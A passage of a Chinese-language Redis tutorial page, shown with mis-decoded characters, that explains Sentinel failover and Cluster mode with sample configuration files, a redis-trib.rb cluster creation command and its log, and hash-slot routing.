<li>ç„¶è€Œä¸€ä¸ªå“¨å…µè¿›ç¨‹å¯¹ Redis æœåŠ¡å™¨è¿›è¡Œç›‘æ§ï¼Œä¹Ÿå¯èƒ½ä¼šå‡ºç°é—®é¢˜ï¼Œä¸ºæ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤šä¸ªå“¨å…µè¿›è¡Œç›‘æ§ã€‚å„ä¸ªå“¨å…µä¹‹é—´è¿˜ä¼šè¿›è¡Œç›‘æ§ï¼Œè¿™æ ·å°±å½¢æˆäº†å¤šå“¨å…µæ¨¡å¼ã€‚</li>
</ul>
<p>å“¨å…µå¾ˆåƒ kafka é›†ç¾¤ä¸­çš„ zookeeper çš„åŠŸèƒ½ã€‚</p>
<h4 id="æœºå™¨è§„åˆ’-1"><a href="#æœºå™¨è§„åˆ’-1" class="headerlink" title="æœºå™¨è§„åˆ’"></a>æœºå™¨è§„åˆ’</h4><table>
<thead>
<tr>
<th>æœºå™¨åç§°</th>
<th>IP</th>
<th>ç«¯å£</th>
</tr>
</thead>
<tbody><tr>
<td>master</td>
<td>192.168.1.10</td>
<td>6379</td>
</tr>
<tr>
<td>slave1</td>
<td>192.168.1.11</td>
<td>6379</td>
</tr>
<tr>
<td>slave2</td>
<td>192.168.1.12</td>
<td>6379</td>
</tr>
<tr>
<td>slave3</td>
<td>192.168.1.13</td>
<td>6379</td>
</tr>
<tr>
<td>sentinel1</td>
<td>192.168.1.14</td>
<td>6379</td>
</tr>
<tr>
<td>sentinel2</td>
<td>192.168.1.15</td>
<td>6379</td>
</tr>
<tr>
<td>sentinel3</td>
<td>192.168.1.16</td>
<td>6379</td>
</tr>
</tbody></table>
<p>è¿™é‡Œå°†å“¨å…µè¿›ç¨‹å’Œ redis åˆ†åˆ«éƒ¨ç½²åœ¨ä¸åŒçš„æœºå™¨ä¸Šï¼Œé¿å…å› ä¸º redis å®•æœºå¯¼è‡´ sentinel è¿›ç¨‹ä¸å¯ç”¨ã€‚</p>
<h4 id="é…ç½®-1"><a href="#é…ç½®-1" class="headerlink" title="é…ç½®"></a>é…ç½®</h4><p>redis.conf çš„é…ç½®å’Œä¸Šé¢ä¸»ä»æ¨¡å¼ä¸€æ ·ï¼Œä¸ç”¨å˜ã€‚è¿™é‡Œä¸»è¦è¯´ä¸€ä¸‹å“¨å…µçš„é…ç½®ã€‚</p>
<p>æ¯å°æœºå™¨çš„å“¨å…µè¿›ç¨‹éƒ½éœ€è¦ä¸€ä¸ªå“¨å…µçš„é…ç½®æ–‡ä»¶<code>sentinel.conf</code>ï¼Œä¸‰å°æœºå™¨çš„å“¨å…µé…ç½®æ˜¯ä¸€æ ·çš„ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">ç¦æ­¢ä¿æŠ¤æ¨¡å¼</span></span><br><span class="line">protected-mode no</span><br><span class="line"><span class="meta"># </span><span class="language-bash">é…ç½®ç›‘å¬çš„ä¸»æœåŠ¡å™¨ï¼Œè¿™é‡Œsentinel monitorä»£è¡¨ç›‘æ§ï¼Œmymasterä»£è¡¨æœåŠ¡å™¨çš„åç§°ï¼Œå¯ä»¥è‡ªå®šä¹‰ï¼Œ</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">192.168.1.10ä»£è¡¨ç›‘æ§çš„ä¸»æœåŠ¡å™¨ï¼Œ6379ä»£è¡¨ç«¯å£ï¼Œ2ä»£è¡¨åªæœ‰ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„å“¨å…µè®¤ä¸ºä¸»æœåŠ¡å™¨ä¸å¯ç”¨çš„æ—¶å€™ï¼Œæ‰ä¼šè¿›è¡Œfailoveræ“ä½œã€‚</span></span><br><span class="line">sentinel monitor mymaster 192.168.1.10 6379 2</span><br><span class="line"><span class="meta"># </span><span class="language-bash">sentinel author-passå®šä¹‰æœåŠ¡çš„å¯†ç ï¼Œmymasteræ˜¯æœåŠ¡åç§°ï¼Œ123456æ˜¯RedisæœåŠ¡å™¨å¯†ç </span></span><br><span class="line">sentinel auth-pass mymaster 123456</span><br></pre></td></tr></table></figure>

<h4 id="æœºå™¨å¯åŠ¨-1"><a href="#æœºå™¨å¯åŠ¨-1" class="headerlink" title="æœºå™¨å¯åŠ¨"></a>æœºå™¨å¯åŠ¨</h4><p>é¦–å…ˆå¯åŠ¨ä¸»èŠ‚ç‚¹ï¼Œç„¶åä¸€å°ä¸€å°å¯åŠ¨ä»èŠ‚ç‚¹ã€‚</p>
<p>redis é›†ç¾¤å¯åŠ¨å®Œæˆåï¼Œåˆ†åˆ«å¯åŠ¨å“¨å…µé›†ç¾¤æ‰€åœ¨æœºå™¨çš„ä¸‰ä¸ªå“¨å…µï¼Œä½¿ç”¨<code>redis-sentinel /path/to/sentinel.conf</code>å‘½ä»¤ã€‚</p>
<h4 id="å“¨å…µæ¨¡å¼çš„å·¥ä½œ"><a href="#å“¨å…µæ¨¡å¼çš„å·¥ä½œ" class="headerlink" title="å“¨å…µæ¨¡å¼çš„å·¥ä½œ"></a>å“¨å…µæ¨¡å¼çš„å·¥ä½œ</h4><ul>
<li>æ¯ä¸ª Sentinelï¼ˆå“¨å…µï¼‰è¿›ç¨‹ä»¥æ¯ç§’é’Ÿä¸€æ¬¡çš„é¢‘ç‡å‘æ•´ä¸ªé›†ç¾¤ä¸­çš„ Master ä¸»æœåŠ¡å™¨ï¼ŒSlave ä»æœåŠ¡å™¨ä»¥åŠå…¶ä»– Sentinelï¼ˆå“¨å…µï¼‰è¿›ç¨‹å‘é€ä¸€ä¸ª PING å‘½ä»¤ã€‚</li>
<li>å¦‚æœä¸€ä¸ªå®ä¾‹ï¼ˆinstanceï¼‰è·ç¦»æœ€åä¸€æ¬¡æœ‰æ•ˆå›å¤ PING å‘½ä»¤çš„æ—¶é—´è¶…è¿‡ down-after-milliseconds é€‰é¡¹æ‰€æŒ‡å®šçš„å€¼ï¼Œ åˆ™è¿™ä¸ªå®ä¾‹ä¼šè¢« Sentinelï¼ˆå“¨å…µï¼‰è¿›ç¨‹æ ‡è®°ä¸ºä¸»è§‚ä¸‹çº¿ï¼ˆSDOWNï¼‰ã€‚</li>
<li>å¦‚æœä¸€ä¸ª Master ä¸»æœåŠ¡å™¨è¢«æ ‡è®°ä¸ºä¸»è§‚ä¸‹çº¿ï¼ˆSDOWNï¼‰ï¼Œåˆ™æ­£åœ¨ç›‘è§†è¿™ä¸ª Master ä¸»æœåŠ¡å™¨çš„æ‰€æœ‰ Sentinelï¼ˆå“¨å…µï¼‰è¿›ç¨‹è¦ä»¥æ¯ç§’ä¸€æ¬¡çš„é¢‘ç‡ç¡®è®¤ Master ä¸»æœåŠ¡å™¨çš„ç¡®è¿›å…¥äº†ä¸»è§‚ä¸‹çº¿çŠ¶æ€ã€‚</li>
<li>å½“æœ‰è¶³å¤Ÿæ•°é‡çš„ Sentinelï¼ˆå“¨å…µï¼‰è¿›ç¨‹ï¼ˆå¤§äºç­‰äºé…ç½®æ–‡ä»¶æŒ‡å®šçš„å€¼ï¼‰åœ¨æŒ‡å®šçš„æ—¶é—´èŒƒå›´å†…ç¡®è®¤ Master ä¸»æœåŠ¡å™¨è¿›å…¥äº†ä¸»è§‚ä¸‹çº¿çŠ¶æ€ï¼ˆSDOWNï¼‰ï¼Œ åˆ™ Master ä¸»æœåŠ¡å™¨ä¼šè¢«æ ‡è®°ä¸ºå®¢è§‚ä¸‹çº¿ï¼ˆODOWNï¼‰ã€‚</li>
<li>åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ¯ä¸ª Sentinelï¼ˆå“¨å…µï¼‰è¿›ç¨‹ä¼šä»¥æ¯ 10 ç§’ä¸€æ¬¡çš„é¢‘ç‡å‘é›†ç¾¤ä¸­çš„æ‰€æœ‰ Master ä¸»æœåŠ¡å™¨ã€Slave ä»æœåŠ¡å™¨å‘é€ INFO å‘½ä»¤ã€‚</li>
<li>å½“ Master ä¸»æœåŠ¡å™¨è¢« Sentinelï¼ˆå“¨å…µï¼‰è¿›ç¨‹æ ‡è®°ä¸ºå®¢è§‚ä¸‹çº¿ï¼ˆODOWNï¼‰æ—¶ï¼ŒSentinelï¼ˆå“¨å…µï¼‰è¿›ç¨‹å‘ä¸‹çº¿çš„ Master ä¸»æœåŠ¡å™¨çš„æ‰€æœ‰ Slave ä»æœåŠ¡å™¨å‘é€ INFO å‘½ä»¤çš„é¢‘ç‡ä¼šä» 10 ç§’ä¸€æ¬¡æ”¹ä¸ºæ¯ç§’ä¸€æ¬¡ã€‚</li>
<li>è‹¥æ²¡æœ‰è¶³å¤Ÿæ•°é‡çš„ Sentinelï¼ˆå“¨å…µï¼‰è¿›ç¨‹åŒæ„ Master ä¸»æœåŠ¡å™¨ä¸‹çº¿ï¼Œ Master ä¸»æœåŠ¡å™¨çš„å®¢è§‚ä¸‹çº¿çŠ¶æ€å°±ä¼šè¢«ç§»é™¤ã€‚è‹¥ Master ä¸»æœåŠ¡å™¨é‡æ–°å‘ Sentinelï¼ˆå“¨å…µï¼‰è¿›ç¨‹å‘é€ PING å‘½ä»¤è¿”å›æœ‰æ•ˆå›å¤ï¼ŒMaster ä¸»æœåŠ¡å™¨çš„ä¸»è§‚ä¸‹çº¿çŠ¶æ€å°±ä¼šè¢«ç§»é™¤ã€‚</li>
</ul>
<p>å‡è®¾ master å®•æœºï¼Œsentinel1 å…ˆæ£€æµ‹åˆ°è¿™ä¸ªç»“æœï¼Œç³»ç»Ÿå¹¶ä¸ä¼šé©¬ä¸Šè¿›è¡Œ failoverï¼ˆæ•…éšœè½¬ç§»ï¼‰é€‰å‡ºæ–°çš„ masterï¼Œä»…ä»…æ˜¯ sentinel 1 ä¸»è§‚çš„è®¤ä¸º master ä¸å¯ç”¨ï¼Œè¿™ä¸ªç°è±¡æˆä¸º<strong>ä¸»è§‚ä¸‹çº¿</strong>ã€‚å½“åé¢çš„å“¨å…µä¹Ÿæ£€æµ‹åˆ°ä¸»æœåŠ¡å™¨ä¸å¯ç”¨ï¼Œå¹¶ä¸”æ•°é‡è¾¾åˆ°ä¸€å®šå€¼æ—¶ï¼Œé‚£ä¹ˆå“¨å…µä¹‹é—´å°±ä¼šè¿›è¡Œä¸€æ¬¡æŠ•ç¥¨ï¼ŒæŠ•ç¥¨çš„ç»“æœç”± sentinel 1 å‘èµ·ï¼Œè¿›è¡Œ failover æ“ä½œã€‚åˆ‡æ¢æˆåŠŸåï¼Œå°±ä¼šé€šè¿‡å‘å¸ƒè®¢é˜…æ¨¡å¼ï¼Œè®©å„ä¸ªå“¨å…µæŠŠè‡ªå·±ç›‘æ§çš„ä»æœåŠ¡å™¨å®ç°åˆ‡æ¢ä¸»æœºï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸º<strong>å®¢è§‚ä¸‹çº¿</strong>ã€‚è¿™æ ·å¯¹äºå®¢æˆ·ç«¯è€Œè¨€ï¼Œä¸€åˆ‡éƒ½æ˜¯é€æ˜çš„ã€‚</p>
<h4 id="ä¸»ä»æ¨¡å¼çš„ä¼˜ç¼ºç‚¹-1"><a href="#ä¸»ä»æ¨¡å¼çš„ä¼˜ç¼ºç‚¹-1" class="headerlink" title="ä¸»ä»æ¨¡å¼çš„ä¼˜ç¼ºç‚¹"></a>ä¸»ä»æ¨¡å¼çš„ä¼˜ç¼ºç‚¹</h4><h5 id="ä¼˜ç‚¹-1"><a href="#ä¼˜ç‚¹-1" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h5><ul>
<li>å“¨å…µæ¨¡å¼æ˜¯åŸºäºä¸»ä»æ¨¡å¼çš„ï¼Œæ‰€æœ‰ä¸»ä»çš„ä¼˜ç‚¹ï¼Œå“¨å…µæ¨¡å¼éƒ½å…·æœ‰ã€‚</li>
<li>ä¸»ä»å¯ä»¥è‡ªåŠ¨åˆ‡æ¢ï¼Œç³»ç»Ÿæ›´å¥å£®ï¼Œå¯ç”¨æ€§æ›´é«˜ã€‚</li>
</ul>
<h5 id="ç¼ºç‚¹-1"><a href="#ç¼ºç‚¹-1" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h5><ul>
<li>å…·æœ‰ä¸»ä»æ¨¡å¼çš„ç¼ºç‚¹ï¼Œæ¯å°æœºå™¨ä¸Šçš„æ•°æ®æ˜¯ä¸€æ ·çš„ï¼Œå†…å­˜çš„å¯ç”¨æ€§è¾ƒä½ã€‚</li>
<li>Redis è¾ƒéš¾æ”¯æŒåœ¨çº¿æ‰©å®¹ï¼Œåœ¨é›†ç¾¤å®¹é‡è¾¾åˆ°ä¸Šé™æ—¶åœ¨çº¿æ‰©å®¹ä¼šå˜å¾—å¾ˆå¤æ‚ã€‚</li>
</ul>
<h3 id="é›†ç¾¤æ¨¡å¼"><a href="#é›†ç¾¤æ¨¡å¼" class="headerlink" title="é›†ç¾¤æ¨¡å¼"></a>é›†ç¾¤æ¨¡å¼</h3><p>å…ˆè¯´ä¸€ä¸ªè¯¯åŒºï¼š<strong>Redis çš„é›†ç¾¤æ¨¡å¼æœ¬èº«æ²¡æœ‰ä½¿ç”¨ä¸€è‡´æ€§ hash ç®—æ³•ï¼Œè€Œæ˜¯ä½¿ç”¨ slots æ’æ§½</strong>ã€‚è¿™æ˜¯å¾ˆå¤šäººçš„ä¸€ä¸ªè¯¯åŒºã€‚è¿™é‡Œå…ˆç•™ä¸ªå‘ï¼Œåé¢æˆ‘ä¼šå‡ºä¸€æœŸã€Š redis ç³»åˆ—ä¹‹â€”â€”ä¸€è‡´æ€§ hash ç®—æ³•ã€‹ã€‚</p>
<p>Redis çš„å“¨å…µæ¨¡å¼åŸºæœ¬å·²ç»å¯ä»¥å®ç°é«˜å¯ç”¨ï¼Œè¯»å†™åˆ†ç¦»ï¼Œä½†æ˜¯åœ¨è¿™ç§æ¨¡å¼ä¸‹æ¯å° Redis æœåŠ¡å™¨éƒ½å­˜å‚¨ç›¸åŒçš„æ•°æ®ï¼Œå¾ˆæµªè´¹å†…å­˜ï¼Œæ‰€ä»¥åœ¨ redis3.0 ä¸ŠåŠ å…¥äº† Cluster é›†ç¾¤æ¨¡å¼ï¼Œå®ç°äº† Redis çš„åˆ†å¸ƒå¼å­˜å‚¨ï¼Œå¯¹æ•°æ®è¿›è¡Œåˆ†ç‰‡ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯å° Redis èŠ‚ç‚¹ä¸Šå­˜å‚¨ä¸åŒçš„å†…å®¹ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282332079.png" alt="img"></p>
<p>è¿™é‡Œçš„ 6 å° redis ä¸¤ä¸¤ä¹‹é—´å¹¶ä¸æ˜¯ç‹¬ç«‹çš„ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½ä¼šé€šè¿‡é›†ç¾¤æ€»çº¿(cluster bus)ï¼Œä¸å…¶ä»–çš„èŠ‚ç‚¹è¿›è¡Œé€šä¿¡ã€‚é€šè®¯æ—¶ä½¿ç”¨ç‰¹æ®Šçš„ç«¯å£å·ï¼Œå³å¯¹å¤–æœåŠ¡ç«¯å£å·åŠ  10000ã€‚ä¾‹å¦‚å¦‚æœæŸä¸ª node çš„ç«¯å£å·æ˜¯ 6379ï¼Œé‚£ä¹ˆå®ƒä¸å…¶å®ƒ nodes é€šä¿¡çš„ç«¯å£å·æ˜¯ 16379ã€‚nodes ä¹‹é—´çš„é€šä¿¡é‡‡ç”¨ç‰¹æ®Šçš„äºŒè¿›åˆ¶åè®®ã€‚</p>
<p>å¯¹å®¢æˆ·ç«¯æ¥è¯´ï¼Œæ•´ä¸ª cluster è¢«çœ‹åšæ˜¯ä¸€ä¸ªæ•´ä½“ï¼Œå®¢æˆ·ç«¯å¯ä»¥è¿æ¥ä»»æ„ä¸€ä¸ª node è¿›è¡Œæ“ä½œï¼Œå°±åƒæ“ä½œå•ä¸€ Redis å®ä¾‹ä¸€æ ·ï¼Œå½“å®¢æˆ·ç«¯æ“ä½œçš„ key æ²¡æœ‰åˆ†é…åˆ°è¯¥ node ä¸Šæ—¶ï¼ŒRedis ä¼šè¿”å›è½¬å‘æŒ‡ä»¤ï¼ŒæŒ‡å‘æ­£ç¡®çš„ nodeï¼Œè¿™æœ‰ç‚¹å„¿åƒæµè§ˆå™¨é¡µé¢çš„ 302 redirect è·³è½¬ã€‚</p>
<p>æ ¹æ®å®˜æ–¹æ¨èï¼Œé›†ç¾¤éƒ¨ç½²è‡³å°‘è¦ 3 å°ä»¥ä¸Šçš„ master èŠ‚ç‚¹ï¼Œæœ€å¥½ä½¿ç”¨ 3 ä¸» 3 ä»å…­ä¸ªèŠ‚ç‚¹çš„æ¨¡å¼ã€‚æµ‹è¯•æ—¶ï¼Œä¹Ÿå¯ä»¥åœ¨ä¸€å°æœºå™¨ä¸Šéƒ¨ç½²è¿™å…­ä¸ªå®ä¾‹ï¼Œé€šè¿‡ç«¯å£åŒºåˆ†å‡ºæ¥ã€‚</p>
<h4 id="æœºå™¨è§„åˆ’-2"><a href="#æœºå™¨è§„åˆ’-2" class="headerlink" title="æœºå™¨è§„åˆ’"></a>æœºå™¨è§„åˆ’</h4><table>
<thead>
<tr>
<th>æœºå™¨åç§°</th>
<th>IP</th>
<th>ç«¯å£</th>
</tr>
</thead>
<tbody><tr>
<td>master1</td>
<td>192.168.1.11</td>
<td>6379</td>
</tr>
<tr>
<td>master2</td>
<td>192.168.1.12</td>
<td>6379</td>
</tr>
<tr>
<td>master3</td>
<td>192.168.1.13</td>
<td>6379</td>
</tr>
<tr>
<td>slave1</td>
<td>192.168.1.21</td>
<td>6379</td>
</tr>
<tr>
<td>slave2</td>
<td>192.168.1.22</td>
<td>6379</td>
</tr>
<tr>
<td>slave3</td>
<td>192.168.1.23</td>
<td>6379</td>
</tr>
</tbody></table>
<h4 id="é…ç½®-2"><a href="#é…ç½®-2" class="headerlink" title="é…ç½®"></a>é…ç½®</h4><p>ä¿®æ”¹<code>redis.conf</code> çš„é…ç½®æ–‡ä»¶:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">å¼€å¯redisçš„é›†ç¾¤æ¨¡å¼</span></span><br><span class="line">cluster-enabled yes</span><br><span class="line"><span class="meta"># </span><span class="language-bash">é…ç½®é›†ç¾¤æ¨¡å¼ä¸‹çš„é…ç½®æ–‡ä»¶åç§°å’Œä½ç½®,redis-cluster.confè¿™ä¸ªæ–‡ä»¶æ˜¯é›†ç¾¤å¯åŠ¨åè‡ªåŠ¨ç”Ÿæˆçš„ï¼Œä¸éœ€è¦æ‰‹åŠ¨é…ç½®ã€‚</span></span><br><span class="line">cluster-config-file redis-cluster.conf</span><br></pre></td></tr></table></figure>

<h4 id="æœºå™¨å¯åŠ¨-2"><a href="#æœºå™¨å¯åŠ¨-2" class="headerlink" title="æœºå™¨å¯åŠ¨"></a>æœºå™¨å¯åŠ¨</h4><p>6 ä¸ª Redis æœåŠ¡åˆ†åˆ«å¯åŠ¨æˆåŠŸä¹‹åï¼Œè¿™æ—¶è™½ç„¶é…ç½®äº†é›†ç¾¤å¼€å¯ï¼Œä½†æ˜¯è¿™å…­å°æœºå™¨è¿˜æ˜¯ç‹¬ç«‹çš„ã€‚ä½¿ç”¨é›†ç¾¤ç®¡ç†å‘½ä»¤å°†è¿™ 6 å°æœºå™¨æ·»åŠ åˆ°ä¸€ä¸ªé›†ç¾¤ä¸­ã€‚</p>
<p>å€ŸåŠ© redis-tri.rb å·¥å…·å¯ä»¥å¿«é€Ÿçš„éƒ¨ç½²é›†ç¾¤ã€‚</p>
<p>åªéœ€è¦æ‰§è¡Œ<code>redis-trib.rb create --replicas 1 192.168.1.11:6379 192.168.1.21:6379 192.168.1.12:6379 192.168.1.22:6379 192.168.1.13:6379 192.168.1.23:6379</code>å°±å¯ä»¥æˆåŠŸåˆ›å»ºé›†ç¾¤ã€‚</p>
<p>è¯¥å‘½ä»¤æ‰§è¡Œåˆ›å»ºå®Œæˆåä¼šæœ‰å“åº”çš„æ—¥å¿—ï¼Œé€šè¿‡ç›¸å…³çš„æ—¥å¿—å°±å¯ä»¥çœ‹å‡ºé›†ç¾¤ä¸­æœºå™¨çš„å…³ç³»ï¼ˆä¸ä¸€å®šå’Œä¸Šå›¾å¯¹åº”ï¼‰ï¼Œæ‰§è¡Œçš„æ—¥å¿—å¦‚ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="language-bash">&gt;&gt; Performing <span class="built_in">hash</span> slots allocation on 6 nodes...</span></span><br><span class="line">Master[0] -&gt; Slots 0 - 5460</span><br><span class="line">Master[1] -&gt; Slots 5461 - 10922</span><br><span class="line">Master[2] -&gt; Slots 10923 - 16383</span><br><span class="line">Adding replica 192.168.1.21:6379 to 192.168.1.11:6379</span><br><span class="line">Adding replica 192.168.1.22:6379 to 192.168.1.12:6379</span><br><span class="line">Adding replica 192.168.1.23:6379 to 192.168.1.13:6379</span><br><span class="line">M: 80c80a3f3e33872c047a8328ad579b9bea001ad8 192.168.1.11:6379   slots:[0-5460] (5461 slots) master</span><br><span class="line">S: b4d3eb411a7355d4767c6c23b4df69fa183ef8bc 192.168.1.21:6379   replicates 6788453ee9a8d7f72b1d45a9093838efd0e501f1</span><br><span class="line">M: 4d74ec66e898bf09006dac86d4928f9fad81f373 192.168.1.12:6379   slots:[5461-10922] (5462 slots) master</span><br><span class="line">S: b6331cbc986794237c83ed2d5c30777c1551546e 192.168.1.22:6379   replicates 80c80a3f3e33872c047a8328ad579b9bea001ad8</span><br><span class="line">M: 6788453ee9a8d7f72b1d45a9093838efd0e501f1 192.168.1.13:6379   slots:[10923-16383] (5461 slots) master</span><br><span class="line">S: 277daeb8660d5273b7c3e05c263f861ed5f17b92 192.168.1.23:6379   replicates 4d74ec66e898bf09006dac86d4928f9fad81f373</span><br><span class="line">Can I set the above configuration? (type &#x27;yes&#x27; to accept): yes                  #è¾“å…¥yesï¼Œæ¥å—ä¸Šé¢é…ç½®</span><br><span class="line"><span class="meta">&gt;</span><span class="language-bash">&gt;&gt; Nodes configuration updated</span></span><br><span class="line"><span class="meta">&gt;</span><span class="language-bash">&gt;&gt; Assign a different config epoch to each node</span></span><br><span class="line"><span class="meta">&gt;</span><span class="language-bash">&gt;&gt; Sending CLUSTER MEET messages to <span class="built_in">join</span> the cluster</span></span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œå®Œæˆåè‡ªåŠ¨ç”Ÿæˆé…ç½®çš„ redis-cluster.conf æ–‡ä»¶ã€‚</p>
<p>ç™»å½•é›†ç¾¤ï¼š<code>redis-cli -c -h 192.168.1.11 -p 6379 -a 123456                  # -cï¼Œä½¿ç”¨é›†ç¾¤æ–¹å¼ç™»å½•</code>ã€‚</p>
<p>æŸ¥çœ‹é›†ç¾¤ä¿¡æ¯ï¼š<code>192.168.1.11:6379&gt; CLUSTER INFO                   #é›†ç¾¤çŠ¶æ€</code>ã€‚</p>
<p>åˆ—å‡ºèŠ‚ç‚¹ä¿¡æ¯ï¼š<code>192.168.1.11:6379&gt; CLUSTER NODES                  #åˆ—å‡ºèŠ‚ç‚¹ä¿¡æ¯</code>ã€‚</p>
<p>æ·»åŠ æ•°æ®ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.1.11:6379&gt; set name aaa</span><br><span class="line"><span class="meta">-&gt; </span><span class="language-bash">Redirected to slot [13680] located at 192.168.1.13:6379                <span class="comment">#è¯´æ˜æœ€ç»ˆå°†æ•°æ®å†™åˆ°äº†192.168.1.13:6379ä¸Š</span></span></span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p>è·å–æ•°æ®ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.1.11:6379&gt; get name</span><br><span class="line"><span class="meta">-&gt; </span><span class="language-bash">Redirected to slot [13680] located at 192.168.1.13:6379                <span class="comment">#è¯´æ˜æœ€ç»ˆåˆ°192.168.1.13:6379ä¸Šè¯»æ•°æ®</span></span></span><br><span class="line">&quot;aaa&quot;</span><br></pre></td></tr></table></figure>

<h4 id="è¿è¡Œæœºåˆ¶"><a href="#è¿è¡Œæœºåˆ¶" class="headerlink" title="è¿è¡Œæœºåˆ¶"></a>è¿è¡Œæœºåˆ¶</h4><p>åœ¨ Redis çš„æ¯ä¸€ä¸ªèŠ‚ç‚¹ä¸Šï¼Œéƒ½æœ‰è¿™ä¹ˆä¸¤ä¸ªä¸œè¥¿ï¼Œä¸€ä¸ªæ˜¯æ’æ§½ï¼ˆslotï¼‰ï¼Œå®ƒçš„çš„å–å€¼èŒƒå›´æ˜¯ï¼š0-16383ï¼Œå¯ä»¥ä»ä¸Šé¢<code>redis-trib.rb</code>æ‰§è¡Œçš„ç»“æœçœ‹åˆ°è¿™ 16383 ä¸ª slot åœ¨ä¸‰ä¸ª master ä¸Šçš„åˆ†å¸ƒã€‚è¿˜æœ‰ä¸€ä¸ªå°±æ˜¯ clusterï¼Œå¯ä»¥ç†è§£ä¸ºæ˜¯ä¸€ä¸ªé›†ç¾¤ç®¡ç†çš„æ’ä»¶ï¼Œç±»ä¼¼çš„å“¨å…µã€‚</p>
<p>å½“æˆ‘ä»¬çš„å­˜å–çš„ Key åˆ°è¾¾çš„æ—¶å€™ï¼ŒRedis ä¼šæ ¹æ® crc16 çš„ç®—æ³•å¯¹è®¡ç®—åå¾—å‡ºä¸€ä¸ªç»“æœï¼Œç„¶åæŠŠç»“æœå’Œ 16384 æ±‚ä½™æ•°ï¼Œè¿™æ ·æ¯ä¸ª key éƒ½ä¼šå¯¹åº”ä¸€ä¸ªç¼–å·åœ¨ 0-16383 ä¹‹é—´çš„å“ˆå¸Œæ§½ï¼Œé€šè¿‡è¿™ä¸ªå€¼ï¼Œå»æ‰¾åˆ°å¯¹åº”çš„æ’æ§½æ‰€å¯¹åº”çš„èŠ‚ç‚¹ï¼Œç„¶åç›´æ¥è‡ªåŠ¨è·³è½¬åˆ°è¿™ä¸ªå¯¹åº”çš„èŠ‚ç‚¹ä¸Šè¿›è¡Œå­˜å–æ“ä½œã€‚</p>
<p>å½“æ•°æ®å†™å…¥åˆ°å¯¹åº”çš„ master èŠ‚ç‚¹åï¼Œè¿™ä¸ªæ•°æ®ä¼šåŒæ­¥ç»™è¿™ä¸ª master å¯¹åº”çš„æ‰€æœ‰ slave èŠ‚ç‚¹ã€‚</p>
<p>ä¸ºäº†ä¿è¯é«˜å¯ç”¨ï¼Œredis-cluster é›†ç¾¤å¼•å…¥äº†ä¸»ä»æ¨¡å¼ï¼Œä¸€ä¸ªä¸»èŠ‚ç‚¹å¯¹åº”ä¸€ä¸ªæˆ–è€…å¤šä¸ªä»èŠ‚ç‚¹ã€‚å½“å…¶å®ƒä¸»èŠ‚ç‚¹ ping ä¸»èŠ‚ç‚¹ master1 æ—¶ï¼Œå¦‚æœåŠæ•°ä»¥ä¸Šçš„ä¸»èŠ‚ç‚¹ä¸ master1 é€šä¿¡è¶…æ—¶ï¼Œé‚£ä¹ˆè®¤ä¸º master1 å®•æœºäº†ï¼Œå°±ä¼šå¯ç”¨ master 1 çš„ä»èŠ‚ç‚¹ slave1ï¼Œå°† slave1 å˜æˆä¸»èŠ‚ç‚¹ç»§ç»­æä¾›æœåŠ¡ã€‚</p>
<p>å¦‚æœ master1 å’Œå®ƒçš„ä»èŠ‚ç‚¹ slave1 éƒ½å®•æœºäº†ï¼Œæ•´ä¸ªé›†ç¾¤å°±ä¼šè¿›å…¥ fail çŠ¶æ€ï¼Œå› ä¸ºé›†ç¾¤çš„ slot æ˜ å°„ä¸å®Œæ•´ã€‚å¦‚æœé›†ç¾¤è¶…è¿‡åŠæ•°ä»¥ä¸Šçš„ master æŒ‚æ‰ï¼Œæ— è®ºæ˜¯å¦æœ‰ slaveï¼Œé›†ç¾¤éƒ½ä¼šè¿›å…¥ fail çŠ¶æ€ã€‚</p>
<p>redis-cluster é‡‡ç”¨å»ä¸­å¿ƒåŒ–çš„æ€æƒ³ï¼Œæ²¡æœ‰ä¸­å¿ƒèŠ‚ç‚¹çš„è¯´æ³•ï¼Œå®¢æˆ·ç«¯ä¸ Redis èŠ‚ç‚¹ç›´è¿ï¼Œä¸éœ€è¦ä¸­é—´ä»£ç†å±‚ï¼Œå®¢æˆ·ç«¯ä¸éœ€è¦è¿æ¥é›†ç¾¤æ‰€æœ‰èŠ‚ç‚¹ï¼Œè¿æ¥é›†ç¾¤ä¸­ä»»ä½•ä¸€ä¸ªå¯ç”¨èŠ‚ç‚¹å³å¯ã€‚</p>
<h4 id="é›†ç¾¤æ‰©ç¼©å®¹"><a href="#é›†ç¾¤æ‰©ç¼©å®¹" class="headerlink" title="é›†ç¾¤æ‰©ç¼©å®¹"></a>é›†ç¾¤æ‰©ç¼©å®¹</h4><p>å¯¹ redis é›†ç¾¤çš„æ‰©å®¹å°±æ˜¯å‘é›†ç¾¤ä¸­æ·»åŠ æœºå™¨ï¼Œç¼©å®¹å°±æ˜¯ä»é›†ç¾¤ä¸­åˆ é™¤æœºå™¨ï¼Œå¹¶é‡æ–°å°† 16383 ä¸ª slots åˆ†é…åˆ°é›†ç¾¤ä¸­çš„èŠ‚ç‚¹ä¸Šï¼ˆæ•°æ®è¿ç§»ï¼‰ã€‚</p>
<p>æ‰©ç¼©å®¹ä¹Ÿæ˜¯ä½¿ç”¨é›†ç¾¤ç®¡ç†å·¥å…· redis-tri.rbã€‚</p>
